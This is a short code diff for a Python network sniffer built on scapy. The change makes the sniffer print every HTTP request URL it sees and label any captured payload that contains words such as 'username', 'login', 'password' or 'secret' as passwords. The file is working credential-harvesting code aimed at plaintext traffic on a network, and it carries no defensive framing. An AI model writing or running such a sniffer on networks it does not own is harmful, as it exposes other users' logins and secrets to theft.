@@ -9,13 +9,15 @@ def sniff(interface):
 def handle_packets(packet):
     if http.HTTPRequest in packet:
         # http packet.
+        print(f"[-] HTTP REQUEST --> {geturl(packet)} \n\n")
+
         if scapy.Raw in packet:
             load = str(packet[scapy.Raw].load)
             keywords = ['username', 'user', 'login', 'register', 'sign-up', 'signUp', 'password', 'pass', 'secret']
 
             for keyword in keywords:
                 if keyword in load:
-                    print(load)
+                    print(f"[+] Passwords --> {load}")
                     break
     # elif scapy.TCP in packet:
     #     if packet[scapy.TCP].dport == 443:
